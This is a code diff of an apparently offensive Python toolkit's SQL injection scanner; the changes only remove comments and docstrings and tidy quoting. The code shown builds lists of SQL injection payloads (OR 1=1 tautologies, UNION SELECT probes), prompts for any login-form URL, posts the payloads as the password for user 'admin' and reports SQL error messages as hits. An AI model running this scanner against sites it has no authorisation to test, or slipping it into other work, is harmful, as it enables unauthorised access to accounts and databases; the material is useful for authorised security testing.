@@ -7,22 +7,18 @@ def generate_random_string(length=6):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 def generate_sql_payloads(num_payloads=10, payload_type='scan'):
-    """
-    Generates a list of SQL injection payloads.
-    """
     scan_templates = [
         f"' OR '{generate_random_string()}'='{generate_random_string()}'",
-        f"\" OR \"{generate_random_string()}\"=\"{generate_random_string()}\"",
-        f"' OR 1=1 --",
-        f"' OR '1'='1' --",
-        f"' OR 1=1 LIMIT 1 --",
-        f"' OR 1=1#",
-        f"' OR 'x'='x",
-        f"1' OR '1'='1",
-        f"1' OR '1'='1'--",
+        f'" OR "{generate_random_string()}"="{generate_random_string()}"',
+        "' OR 1=1 --",
+        "' OR '1'='1' --",
+        "' OR 1=1 LIMIT 1 --",
+        "' OR 1=1#",
+        "' OR 'x'='x",
+        "1' OR '1'='1",
+        "1' OR '1'='1'--",
     ]
 
-    # More aggressive payloads for injection attempts
     injection_templates = [
         "' UNION SELECT 1,2,3 --",
         "' UNION SELECT NULL,NULL,NULL --",
@@ -35,9 +31,6 @@ def generate_sql_payloads(num_payloads=10, payload_type='scan'):
     return random.choices(templates, k=num_payloads)
 
 def sql_injection_scanner_tool():
-    """
-    Scans a URL for SQL injection vulnerabilities by testing various payloads.
-    """
     print(f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} SQL Injection Scanner")
 
     url = input(f"{Color.DARK_GRAY}  - {Color.WHITE}Enter the full URL of the login form: {Color.RESET}").strip()
@@ -60,7 +53,6 @@ def sql_injection_scanner_tool():
         print(f"{Color.DARK_GRAY}[{Color.RED}✖{Color.DARK_GRAY}]{Color.RED} Invalid number. Using default of 10.")
         num_payloads = 10
 
-    # Keywords that indicate a potential SQL error in the response
     error_keywords = [
         "sql", "syntax", "mysql", "unclosed", "database", "query", "warning", "fatal", "error"
     ]
@@ -71,13 +63,11 @@ def sql_injection_scanner_tool():
     vulnerable = False
     for payload in payloads:
         data = {
-            username_field: 'admin', # Use a common username
+            username_field: 'admin',
             password_field: payload
         }
         try:
             response = requests.post(url, data=data, timeout=10)
-
-            # Check for SQL error keywords in the response text
             if any(keyword in response.text.lower() for keyword in error_keywords):
                 print(f"{Color.DARK_GRAY}[{Color.LIGHT_GREEN}✔{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Potential vulnerability found!")
                 print(f"  Payload: {Color.WHITE}{payload}")
